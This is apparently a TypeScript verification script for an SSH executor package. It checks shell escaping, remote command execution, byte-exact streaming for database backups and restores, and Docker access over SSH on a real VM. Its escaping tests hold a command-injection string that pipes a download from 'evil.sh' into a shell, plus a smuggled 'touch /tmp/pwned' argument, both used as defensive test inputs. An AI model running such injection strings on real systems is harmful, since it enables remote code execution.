// tier: vm
//   bun  run packages/ssh-executor/src/verify.ts
//   node --experimental-strip-types packages/ssh-executor/src/verify.ts
//
// Targets a real VM, not a mock. The default target is the spike's.
import { createHash, randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

import { devTarget } from "@noddle/testing/dev-target";

import { connect, disconnect, dockerClient, exec, execArgv, execStream, quoteArg } from "#index";
import type { ServerCredentials } from "#index";

/** Digest recorded ON the VM, to compare against the one recomputed here. */
let remoteDigest = "";
const WHITESPACE = /\s+/;

const TARGET = devTarget();

const runtime =
  globalThis.Bun === undefined ? `Node ${process.version}` : `Bun ${globalThis.Bun.version}`;

let pass = 0;
let fail = 0;
const ok = (m: string) => {
  pass += 1;
  console.log(`  \u001B[32m?\u001B[0m ${m}`);
};
const ko = (m: string) => {
  fail += 1;
  console.log(`  \u001B[31m?\u001B[0m ${m}`);
};

console.log(`\n\u001B[1mRuntime: ${runtime}\u001B[0m`);
console.log(`Target  : ${TARGET.user}@${TARGET.host}\n`);

// The key must never be logged, here or anywhere else.
const creds: ServerCredentials = {
  host: TARGET.host,
  privateKey: TARGET.privateKey,
  user: TARGET.user,
};

// ?? 1. Shell escaping (pure, testable without network) ???????????????????????
{
  const nasty = `main'; curl evil.sh | sh; echo '`;
  const quoted = quoteArg(nasty);
  // Once escaped, the string must be a single word for the shell: no `;`
  // or `|` should come out unprotected.
  const reopens = quoted.slice(1, -1).includes("'") && !quoted.includes(`'\\''`);
  if (quoted.startsWith("'") && quoted.endsWith("'") && !reopens) {
    ok("quoteArg neutralizes an injection");
  } else {
    ko(`quoteArg lets through: ${quoted}`);
  }
}

let client: Awaited<ReturnType<typeof connect>> | undefined;

try {
  // ?? 2. SSH connection ????????????????????????????????????????????????????
  client = await connect(creds);
  ok("ssh2: connection established");

  // ?? 3. exec + output capture ?????????????????????????????????????????????
  const uname = await exec(client, "uname -sr");
  if (uname.code === 0 && uname.stdout.trim()) {
    ok(`ssh2 exec: ${uname.stdout.trim()}`);
  } else {
    ko(`ssh2 exec failed (code ${uname.code})`);
  }

  // ?? 4. non-zero exit code correctly propagated ???????????????????????????
  const failing = await exec(client, "exit 42");
  if (failing.code === 42) {
    ok("ssh2 exec: exit code propagated (42)");
  } else {
    ko(`expected code 42, got ${failing.code}`);
  }

  // ?? 5. execArgv: the argument stays a single word ????????????????????????
  const injected = await execArgv(client, ["echo", "a; touch /tmp/pwned; b"]);
  const clean =
    injected.stdout.trim() === "a; touch /tmp/pwned; b" &&
    (await exec(client, "test -e /tmp/pwned")).code !== 0;
  if (clean) {
    ok("execArgv: injection neutralized on a real shell");
  } else {
    ko(`execArgv let through: ${injected.stdout.trim()}`);
  }

  // ?? 6. line-by-line streaming (basis of the logs' SSE stream) ????????????
  let chunks = 0;
  await exec(client, "for i in 1 2 3; do echo ligne-$i; sleep 0.2; done", {
    onStdout: () => {
      chunks += 1;
    },
  });
  if (chunks > 0) {
    ok(`streaming: ${chunks} fragment(s) received as they arrived`);
  } else {
    ko("streaming: no fragment received");
  }

  // ?? 7. execStream: BYTES, not text ????????????????????????????????????????
  // The backups' path. `exec()` concatenates in UTF-8: on a binary dump it
  // corrupts the bytes. We generate 8 MiB of randomness on the VM, record
  // its sha256 THERE, then send it through the channel and recompute it
  // HERE. Two identical digests prove the transport.
  const REMOTE_BLOB = "/tmp/noddle-execstream-probe.bin";
  await exec(
    client,
    `head -c 8388608 /dev/urandom > ${REMOTE_BLOB} && sha256sum ${REMOTE_BLOB}`,
  ).then((r) => {
    remoteDigest = r.stdout.trim().split(WHITESPACE)[0] ?? "";
  });

  const streamed = await execStream(client, `cat ${REMOTE_BLOB}`, async ({ stdout }) => {
    const hash = createHash("sha256");
    let bytes = 0;
    for await (const chunk of stdout) {
      bytes += (chunk as Buffer).length;
      hash.update(chunk as Buffer);
    }
    return { bytes, digest: hash.digest("hex") };
  });

  if (streamed.value.bytes === 8_388_608) {
    ok(`execStream: ${streamed.value.bytes} bytes transferred`);
  } else {
    ko(`execStream: ${streamed.value.bytes} bytes, expected 8388608`);
  }
  if (streamed.value.digest === remoteDigest) {
    ok(`execStream: identical sha256 end to end (${remoteDigest.slice(0, 16)}…)`);
  } else {
    ko(`execStream: DIFFERENT sha256 — ${streamed.value.digest} vs ${remoteDigest}`);
  }
  if (streamed.code === 0) {
    ok("execStream: exit code 0 recorded after the stream");
  } else {
    ko(`execStream: code ${streamed.code}, expected 0`);
  }

  // ?? 8. The case that decides everything: complete output, NON-zero code ??
  // This is the exact shape of a `pg_dump` killed mid-run: valid bytes
  // arrive, the stream closes cleanly, and NOTHING in the bytes says
  // anything is missing. If the exit code didn't come back, a half-backup
  // would be recorded as successful.
  const truncated = await execStream(
    client,
    "echo -n 'moitie-de-dump'; exit 3",
    async ({ stdout }) => {
      let bytes = 0;
      for await (const chunk of stdout) {
        bytes += (chunk as Buffer).length;
      }
      return bytes;
    },
  );
  if (truncated.value > 0 && truncated.code === 3) {
    ok(
      `execStream: ${truncated.value} bytes received AND code ${truncated.code} — a truncated dump is detectable`,
    );
  } else {
    ko(`execStream: bytes=${truncated.value} code=${truncated.code}, expected >0 and 3`);
  }

  // ?? 9. Standard input — the restore path ??????????????????????????????????
  const payload = randomBytes(1_048_576);
  const expectedIn = createHash("sha256").update(payload).digest("hex");
  const pushed = await execStream(
    client,
    "sha256sum | cut -d' ' -f1",
    async ({ stdin, stdout }) => {
      let out = "";
      stdout.setEncoding("utf-8");
      const collected = new Promise<void>((res) => {
        stdout.on("data", (d: string) => {
          out += d;
        });
        stdout.on("end", () => res());
      });
      await new Promise<void>((res, rej) => {
        stdin.write(payload, (e) => (e ? rej(e) : res()));
      });
      stdin.end();
      await collected;
      return out.trim();
    },
  );
  if (pushed.value === expectedIn) {
    ok("execStream: 1 MiB pushed via stdin, sha256 confirmed remotely");
  } else {
    ko(`execStream stdin: ${pushed.value} vs ${expectedIn}`);
  }

  await exec(client, `rm -f ${REMOTE_BLOB}`);

  // ?? 10. dockerode through the SSH tunnel ??????????????????????????????????
  const docker = dockerClient(client);
  const version = await docker.version();
  if (version?.Version) {
    ok(`dockerode via SSH: Docker ${version.Version} (API ${version.ApiVersion})`);
  } else {
    ko("dockerode: empty version response");
  }

  // ?? 11. Structured state reading — the whole point of dockerode ??????????
  // Phase 0 showed that `docker service update` returns 0 after a
  // rollback. The real state can only be read from UpdateStatus.
  const services = await docker.listServices();
  ok(`dockerode: ${services.length} service(s) listed`);

  const spike = services.find((s) => s.Spec?.Name === "spike-app");
  if (spike) {
    const state = (spike as { UpdateStatus?: { State?: string } }).UpdateStatus?.State;
    ok(`dockerode: UpdateStatus.State = ${state ?? "(none)"} — readable without parsing text`);
  }
} catch (error) {
  ko(`exception: ${error instanceof Error ? error.message : String(error)}`);
  if (error instanceof Error && error.stack) {
    console.log(error.stack.split("\n").slice(1, 4).join("\n"));
  }
} finally {
  if (client) {
    disconnect(client);
  }
}

console.log(`\n\u001B[1m${runtime} — passed ${pass}, failed ${fail}\u001B[0m\n`);
process.exit(fail === 0 ? 0 : 1);
